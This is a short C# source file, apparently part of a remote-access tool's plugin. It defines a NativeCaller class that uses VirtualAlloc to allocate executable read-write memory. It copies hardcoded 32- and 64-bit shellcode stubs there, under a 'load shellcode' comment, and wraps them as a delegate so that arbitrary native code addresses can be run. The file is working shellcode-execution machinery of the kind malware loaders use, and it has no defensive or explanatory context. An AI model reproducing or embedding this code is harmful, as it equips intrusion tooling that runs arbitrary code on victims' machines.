using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace Miscellaneous.Handler
{
    internal static class NativeCaller
    {
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,
          int size, int flAllocationType, int flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CodeCallerDelegate(IntPtr address);

        private static CodeCallerDelegate function;

        static NativeCaller()
        {
            Load();
        }

        public static void Call(IntPtr address)
        {
            function(address);
        }

        public static IntPtr AllocateExecutableCode(IntPtr desiredAddress, byte[] code)
        {
            IntPtr allocated = VirtualAlloc(desiredAddress, code.Length, 0x1000, 0x40);
            if (allocated == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());
            Marshal.Copy(code, 0, allocated, code.Length);
            return allocated;
        }

        private static void Load()
        {
            // load shellcode
            int bits = IntPtr.Size * 8;
            if (bits == 64)
            {
                address = AllocateExecutableCode(IntPtr.Zero, callerCode64);
            }
            else if (bits == 32)
            {
                address = AllocateExecutableCode(IntPtr.Zero, callerCode);
            }

            function = (CodeCallerDelegate)Marshal.GetDelegateForFunctionPointer((IntPtr)address, typeof(CodeCallerDelegate));
        }

        private static byte[] callerCode = new byte[] { 0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0xFF, 0xD0, 0x5D, 0xC2, 0x04, 0x00 };
        private static byte[] callerCode64 = new byte[] { 0x55, 0x48, 0x89, 0xE5, 0xFF, 0xD1, 0x5D, 0x48, 0x89, 0xEC, 0xC2, 0x08, 0x00 };
        private static IntPtr address;
    }

}
